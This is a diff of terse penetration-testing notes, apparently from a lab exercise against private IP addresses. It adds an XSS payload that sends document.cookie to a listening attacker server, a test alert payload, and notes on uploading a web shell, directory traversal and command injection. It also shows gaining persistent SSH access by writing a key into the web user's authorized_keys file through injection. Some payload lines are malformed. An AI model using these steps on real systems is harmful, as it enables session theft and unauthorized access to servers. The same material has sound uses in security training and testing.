@@ -90,11 +90,22 @@ nmap --script http-enum.nse 10.50.45.126 -p80
 nikto -host 10.50.45.126
 
 python3 -m http.server
-<scrit>document.location="http://10.50.21.11:8000/"+document.cookie;<script
+<script>document.location="http://10.50.21.11:8000/"+document.cookie;<script>
+<script>alert('hello')</script)
 
+upload web shell to obtain access in the site
 
+directory traversal take all the way back then take it forward (../../../../../../../<command path you want to go to)
 
+checking for command injection consists of testing with a semi colon before a command.
 
+gaining bash access:
+
+ssh-keygen -t rsa -b 4096 (create keys)
+
+(through web injection) echo "public key" > /var/www/.ssh/authorized_keys
+
+ssh -i <id_rsa> www-data@10.50.45.126 (get in using their private key instead of adding your public key)
 
 
 
